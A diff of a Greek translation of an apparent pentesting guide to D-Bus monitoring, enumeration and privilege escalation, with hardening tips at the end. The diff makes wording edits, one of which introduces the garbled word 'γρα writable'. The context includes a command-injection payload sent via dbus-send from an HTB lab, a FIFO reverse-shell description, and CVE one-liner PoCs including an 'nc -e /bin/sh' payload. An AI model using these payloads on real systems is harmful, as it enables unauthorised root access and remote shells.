@@ -156,7 +156,7 @@ org.freedesktop.DBus.Properties     interface -         -            -
 
 Με αρκετά δικαιώματα (μόνο τα δικαιώματα `send_destination` και `receive_sender` δεν είναι αρκετά) μπορείτε να **παρακολουθήσετε μια επικοινωνία D-Bus**.
 
-Για να **παρακολουθήσετε** μια **επικοινωνία** θα χρειαστεί να είστε **root.** Αν εξακολουθείτε να έχετε προβλήματα ως root, ελέγξτε [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) και [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+Για να **παρακολουθήσετε** μια **επικοινωνία** θα χρειαστεί να είστε **root.** Αν εξακολουθείτε να αντιμετωπίζετε προβλήματα ως root, ελέγξτε [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) και [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 > [!WARNING]
 > Αν ξέρετε πώς να ρυθμίσετε ένα αρχείο ρύθμισης D-Bus για να **επιτρέψετε σε μη root χρήστες να παρακολουθούν** την επικοινωνία, παρακαλώ **επικοινωνήστε μαζί μου**!
@@ -167,7 +167,7 @@ sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-Στο παρακάτω παράδειγμα, η διεπαφή `htb.oouch.Block` παρακολουθείται και **το μήνυμα "**_**lalalalal**_**" αποστέλλεται μέσω κακής επικοινωνίας**:
+Στο παρακάτω παράδειγμα, η διεπαφή `htb.oouch.Block` παρακολουθείται και **το μήνυμα "**_**lalalalal**_**" αποστέλλεται μέσω παρεξήγησης**:
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -231,7 +231,7 @@ dbus-monitor "type=method_call" "type=method_return" "type=error"
 
 </busconfig>
 ```
-Σημείωση από την προηγούμενη ρύθμιση ότι **θα χρειαστεί να είστε ο χρήστης `root` ή `www-data` για να στείλετε και να λάβετε πληροφορίες** μέσω αυτής της επικοινωνίας D-BUS.
+Σημειώστε από την προηγούμενη ρύθμιση ότι **θα χρειαστεί να είστε ο χρήστης `root` ή `www-data` για να στείλετε και να λάβετε πληροφορίες** μέσω αυτής της επικοινωνίας D-BUS.
 
 Ως χρήστης **qtc** μέσα στο κοντέινερ docker **aeb4525789d8** μπορείτε να βρείτε κάποιο κώδικα σχετικό με το dbus στο αρχείο _/code/oouch/routes.py._ Αυτός είναι ο ενδιαφέρον κώδικας:
 ```python
@@ -283,11 +283,11 @@ bus.close()
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
 - `dbus-send` είναι ένα εργαλείο που χρησιμοποιείται για την αποστολή μηνυμάτων στο “Message Bus”
-- Message Bus – Ένα λογισμικό που χρησιμοποιείται από τα συστήματα για να διευκολύνει τις επικοινωνίες μεταξύ εφαρμογών. Σχετίζεται με το Message Queue (τα μηνύματα είναι διατεταγμένα σε ακολουθία) αλλά στο Message Bus τα μηνύματα αποστέλλονται σε μοντέλο συνδρομής και είναι επίσης πολύ γρήγορα.
+- Message Bus – Ένα λογισμικό που χρησιμοποιείται από τα συστήματα για να διευκολύνει τις επικοινωνίες μεταξύ εφαρμογών. Σχετίζεται με το Message Queue (τα μηνύματα είναι διατεταγμένα σε σειρά) αλλά στο Message Bus τα μηνύματα αποστέλλονται σε μοντέλο συνδρομής και είναι επίσης πολύ γρήγορα.
 - Η ετικέτα “-system” χρησιμοποιείται για να αναφέρει ότι είναι ένα σύστημα μήνυμα, όχι μήνυμα συνεδρίας (κατά προεπιλογή).
 - Η ετικέτα “–print-reply” χρησιμοποιείται για να εκτυπώσει το μήνυμά μας κατάλληλα και να λάβει οποιεσδήποτε απαντήσεις σε αναγνώσιμη μορφή από άνθρωπο.
 - “–dest=Dbus-Interface-Block” Η διεύθυνση της διεπαφής Dbus.
-- “–string:” – Τύπος μηνύματος που θέλουμε να στείλουμε στη διεπαφή. Υπάρχουν διάφορες μορφές αποστολής μηνυμάτων όπως διπλά, bytes, booleans, int, objpath. Από αυτά, το “object path” είναι χρήσιμο όταν θέλουμε να στείλουμε μια διαδρομή ενός αρχείου στη διεπαφή Dbus. Μπορούμε να χρησιμοποιήσουμε ένα ειδικό αρχείο (FIFO) σε αυτή την περίπτωση για να περάσουμε μια εντολή στη διεπαφή με το όνομα ενός αρχείου. “string:;” – Αυτό είναι για να καλέσουμε ξανά το object path όπου τοποθετούμε το αρχείο/εντολή του FIFO reverse shell.
+- “–string:” – Τύπος μηνύματος που θέλουμε να στείλουμε στη διεπαφή. Υπάρχουν διάφορες μορφές αποστολής μηνυμάτων όπως διπλά, bytes, booleans, int, objpath. Από αυτά, το “object path” είναι χρήσιμο όταν θέλουμε να στείλουμε μια διαδρομή ενός αρχείου στη διεπαφή Dbus. Μπορούμε να χρησιμοποιήσουμε ένα ειδικό αρχείο (FIFO) σε αυτή την περίπτωση για να περάσουμε μια εντολή στη διεπαφή με το όνομα ενός αρχείου. “string:;” – Αυτό είναι για να καλέσουμε ξανά το object path όπου τοποθετούμε το αρχείο/εντολή FIFO reverse shell.
 
 _Σημειώστε ότι στο `htb.oouch.Block.Block`, το πρώτο μέρος (`htb.oouch.Block`) αναφέρεται στο αντικείμενο υπηρεσίας και το τελευταίο μέρος (`.Block`) αναφέρεται στο όνομα της μεθόδου._
 
@@ -441,7 +441,7 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 * Γραμμένο σε C; ενιαίο στατικό δυαδικό αρχείο (<50 kB) που διασχίζει κάθε διαδρομή αντικειμένου, αντλεί το XML `Introspect` και το χαρτογραφεί στο PID/UID του κατόχου.
 * Χρήσιμες σημαίες:
 ```bash
-# Λίστα όλων των υπηρεσιών στο *σύστημα* bus και εξαγωγή όλων των καλούμενων μεθόδων
+# Λίστα κάθε υπηρεσίας στο *σύστημα* bus και εκτύπωση όλων των καλούμενων μεθόδων
 sudo dbus-map --dump-methods
 
 # Ενεργή έρευνα μεθόδων/ιδιοτήτων που μπορείτε να προσεγγίσετε χωρίς προτροπές Polkit
@@ -451,13 +451,13 @@ sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
 
 ### uptux.py
 * Συγγραφέας: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
-* Σενάριο μόνο Python που αναζητά *γραφόμενες* διαδρομές σε μονάδες systemd **και** υπερβολικά επιτρεπτικά αρχεία πολιτικής D-Bus (π.χ. `send_destination="*"`).
+* Σενάριο μόνο Python που αναζητά *γρα writable* διαδρομές σε μονάδες systemd **και** υπερβολικά επιτρεπτικά αρχεία πολιτικής D-Bus (π.χ. `send_destination="*"`).
 * Γρήγορη χρήση:
 ```bash
 python3 uptux.py -n          # εκτέλεση όλων των ελέγχων αλλά χωρίς να γράψει αρχείο καταγραφής
 python3 uptux.py -d          # ενεργοποίηση εκτενούς εξόδου αποσφαλμάτωσης
 ```
-* Το module D-Bus αναζητά τους καταλόγους παρακάτω και επισημαίνει οποιαδήποτε υπηρεσία μπορεί να παραποιηθεί ή να καταληφθεί από έναν κανονικό χρήστη:
+* Το module D-Bus αναζητά τις καταλόγους παρακάτω και επισημαίνει οποιαδήποτε υπηρεσία μπορεί να παραποιηθεί ή να καταληφθεί από έναν κανονικό χρήστη:
 * `/etc/dbus-1/system.d/` και `/usr/share/dbus-1/system.d/`
 * `/etc/dbus-1/system-local.d/` (υπερκαλύψεις προμηθευτή)
 
@@ -467,11 +467,11 @@ python3 uptux.py -d          # ενεργοποίηση εκτενούς εξό�
 
 Η παρακολούθηση πρόσφατα δημοσιευμένων CVEs βοηθά στην ανίχνευση παρόμοιων ανασφαλών προτύπων σε προσαρμοσμένο κώδικα. Τα παρακάτω ζητήματα τοπικής EoP υψηλής επίπτωσης προέρχονται όλα από την έλλειψη αυθεντικοποίησης/εξουσιοδότησης στο **σύστημα bus**:
 
-| Έτος | CVE | Συστατικό | Ρίζα Αιτίας | One-Liner PoC |
+| Έτος | CVE | Συστατικό | Ρίζα Αιτία | One-Liner PoC |
 |------|-----|-----------|------------|---------------|
 | 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (Logitech HID daemon) | Η υπηρεσία συστήματος `logid` εκθέτει μια απεριόριστη διεπαφή `org.freedesktop.Logiopsd` που επιτρέπει σε *οποιονδήποτε* χρήστη να αλλάξει προφίλ συσκευών και να εισάγει αυθαίρετες εντολές shell μέσω συμβολοσειρών μακροεντολών. | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
 | 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | Ένας proxy που εκτελείται ως root προωθεί παλιές ονομασίες bus σε υπηρεσίες backend **χωρίς να προωθεί το UID/Polkit του καλούντος**, οπότε κάθε προωθημένο αίτημα αντιμετωπίζεται ως UID 0. | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
-| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | Η δημόσια μέθοδος `Dispatch` στερείται οποιωνδήποτε ACLs → ο επιτιθέμενος μπορεί να διατάξει τον *εργάτη του package-manager* να εγκαταστήσει αυθαίρετα RPMs. | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |
+| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | Η δημόσια μέθοδος `Dispatch` στερείται οποιωνδήποτε ACLs → ο επιτιθέμενος μπορεί να διατάξει τον *εργάτη διαχειριστή πακέτων* να εγκαταστήσει αυθαίρετα RPMs. | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |
 
 Πρότυπα που πρέπει να παρατηρηθούν:
 1. Η υπηρεσία εκτελείται **ως root στο σύστημα bus**.
@@ -484,11 +484,11 @@ python3 uptux.py -d          # ενεργοποίηση εκτενούς εξό�
 
 ## Γρήγορες Νίκες Σκληροποίησης & Ανίχνευσης
 
-* Αναζητήστε παγκοσμίως εγγράψιμες ή *ανοιχτές για αποστολή/λήψη* πολιτικές:
+* Αναζητήστε παγκοσμίως εγγράψιμες ή *send/receive*-ανοιχτές πολιτικές:
 ```bash
 grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
 ```
-* Απαιτήστε Polkit για επικίνδυνες μεθόδους – ακόμη και οι *root* proxies θα πρέπει να περάσουν το *PID του καλούντος* στη `polkit_authority_check_authorization_sync()` αντί για το δικό τους.
+* Απαιτήστε Polkit για επικίνδυνες μεθόδους – ακόμη και οι *root* proxies θα πρέπει να περάσουν το *caller* PID στη `polkit_authority_check_authorization_sync()` αντί για το δικό τους.
 * Απορρίψτε τα δικαιώματα σε μακροχρόνιους βοηθούς (χρησιμοποιήστε `sd_pid_get_owner_uid()` για να αλλάξετε namespaces μετά τη σύνδεση στο bus).
 * Εάν δεν μπορείτε να αφαιρέσετε μια υπηρεσία, τουλάχιστον *περιορίστε* την σε μια αφιερωμένη ομάδα Unix και περιορίστε την πρόσβαση στην πολιτική XML της.
 * Blue-team: ενεργοποιήστε την επίμονη καταγραφή του συστήματος bus με `busctl capture --output=/var/log/dbus_$(date +%F).pcap` και εισάγετε στο Wireshark για ανίχνευση ανωμαλιών.
